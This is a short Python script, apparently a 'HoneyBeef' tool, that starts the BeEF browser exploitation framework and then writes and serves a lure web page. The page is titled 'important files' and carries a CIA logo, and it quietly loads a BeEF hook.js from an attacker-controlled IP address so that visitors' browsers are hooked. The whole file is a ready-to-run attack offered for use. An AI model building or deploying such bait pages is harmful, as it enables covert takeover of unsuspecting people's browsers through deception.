#!/usr/bin/python
# -*- coding: utf-8 -*- 

#beef 

print ('''
#criado por Rondinelli Castilho
  _    _                        ____             __ 
 | |  | |                      |  _ \           / _|
 | |__| | ___  _ __   ___ _   _| |_) | ___  ___| |_ 
 |  __  |/ _ \| '_ \ / _ \ | | |  _ < / _ \/ _ \  _|
 | |  | | (_) | | | |  __/ |_| | |_) |  __/  __/ |  
 |_|  |_|\___/|_| |_|\___|\__, |____/ \___|\___|_|  
                           __/ |                    
                          |___/                    ''')
import os
os.system('service beef-xss start')
os.system('sudo beef-xss | grep start')
os.system('clear')
#beef

#ip
print ("#IP")
print ('')
os.system('ifconfig | grep inet')
print ('')
#ip


#html
indexA = '''<!DOCTYPE html>
<p style="text-align: center;"><strong>Arquivos importantes</strong></p>
<p style="text-align: center;"><strong><img src="http://cybersecurity.startupitalia.eu/wp-content/uploads/sites/14/2017/03/logo_cia.png" alt="" width="400" height="400" /></strong></p>
<script type="text/javascript" src="http://192.168.0.106:3000/hook.js"></script>
<p style="text-align: center;">&nbsp;</p> '''
index = open("index.html","w+")
index.write(indexA)
index.close()
#html


#server
import SimpleHTTPServer
import SocketServer

PORT = 8000

Handler = SimpleHTTPServer.SimpleHTTPRequestHandler

httpd = SocketServer.TCPServer(("", PORT), Handler)

print "Webserver na porta:", PORT
httpd.serve_forever()
#server
